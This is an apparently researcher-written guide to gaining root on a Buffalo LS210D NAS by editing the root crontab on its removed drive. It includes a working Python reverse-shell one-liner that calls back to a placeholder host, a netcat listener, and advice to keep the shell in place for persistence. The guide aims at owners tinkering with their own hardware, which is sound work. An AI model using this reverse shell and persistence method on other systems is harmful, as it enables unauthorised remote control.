Test

How to Hack your Buffalo LS210D and get Root  
Christopher J. Pace and Ryan Miller

The LS210D is a Network Attached Storage (NAS) drive manufactured by Buffalo. Despite having recent vulnerabilities, the NAS drive appears to be well made. One of the best features of this NAS is that it runs Linux, specifically kernel version 3.3.4 (ARM). This means that if you had full root access to the device, you could install additional software or write your own web server. The NAS also comes with Python 2.7.2 and PHP-CGI version 5.3.23, making it the perfect platform for tinkering. However, out-of-the-box, the NAS does not allow full root access or allow SSH connectivity. This guide, part of our research on vulnerabilities for the Buffalo LS210D, is provided for anyone who legitimately owns an LS210D and wishes to have that root access.

Other than firmware tampering, you can also get access to the Buffalo LS210D via an external hard drive reader and a spare PC. You can probably depress the plastic catches on the outside of the NAS drive, but I decided to take a more drastic approach.



Once you have opened your LS210D, you can see that a spinner is mounted into a SATA interface on the system board. Unscrew the screws on the hard drive, and then slide while lifting to remove the hard drive. You can also remove the hard drive bracket, which may make it easier to remove the hard drive. To remove the hard drive bracket, gently rock it back and forth before lifting. There is a thermal pad that sits between the hard drive bracket and the CPU, gently rocking the hard drive bracket will allow you to remove the pad without tearing it.

Inserting the hard drive into a Linux-based PC (or using free ext3 Windows utilities), mount the hard drive. From here, you are looking to modify the file /etc/cron/crontabs/root, where you can add the following two lines at the bottom:

**\*/5 \* \* \* \* /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("YOUR\_IP",8088));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/bash","-i"\]);'**  
**\*/5 \* \* \* \* /usr/sbin/sshd**

Obviously replace the text YOUR\_IP with the IP address of a computer on the same network as the LS210D, making sure to preserve the quotes. The first line spawns a shell via python, and connects to another computer’s netcat session. The second line spawns the SSH service. These commands are ran every 5 minutes, but there is no noticeable impact of having them re-run continuously. If you would like, you can remove the first line once you’ve established a stable SSH session.

Once you’ve written those two lines to the root crontab file, start a netcat session on your PC that is on the same network as the LS210D:

**netcat -l 8088**

Once that command has entered on your PC, put the LS210D back together, and start it up. Once the clock reaches any minute that is divisible by 5, you will have an incoming connection from the NAS to your listening netcat session.



Once you receive the message “bash: no job control in this shell”, you’ll have full root privileges on the NAS. However, netcat is notoriously unstable, so you will want to immediately reset the root password via the ‘passwd’ command. Finally, you need to generate the host SSH keys, via these commands:

**ssh-keygen -t rsa -f /etc/ssh\_host\_rsa\_key -N ""**  
**ssh-keygen -t dsa -f /etc/ssh\_host\_dsa\_key -N ""**  
**ssh-keygen -t dsa -f /etc/ssh\_host\_key -N ""**



Now, after another 5 minutes, you should be able to SSH into the NAS. Make sure to confirm SSH access before terminating your netcat session, to make sure you didn’t mistype your new root password. Enjoy your new root privileges!

**To enable persistence, leave the reverse shell intact. If the Buffalo NAS is shut down improperly or loses power, it will reset the root password back to the default. The reverse shell configuration will enable you to reset the password back to whatever you want.**
